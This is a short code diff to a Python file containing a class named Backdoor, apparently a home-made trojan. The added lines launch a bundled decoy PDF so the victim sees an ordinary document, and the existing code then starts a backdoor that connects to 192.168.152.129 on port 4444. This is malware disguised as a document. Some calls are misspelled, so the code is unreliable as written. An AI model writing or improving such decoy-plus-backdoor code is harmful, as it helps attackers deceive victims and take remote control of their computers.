@@ -71,6 +71,9 @@ class Backdoor:
 
 
 if __name__ == '__main__':
+    file_name = sys.MEIPASS + "\sample.pdf"
+    subprocess.popen(file_name, shell=True)
+    
     try:
         my_backdoor = Backdoor("192.168.152.129", 4444)
         my_backdoor.run()
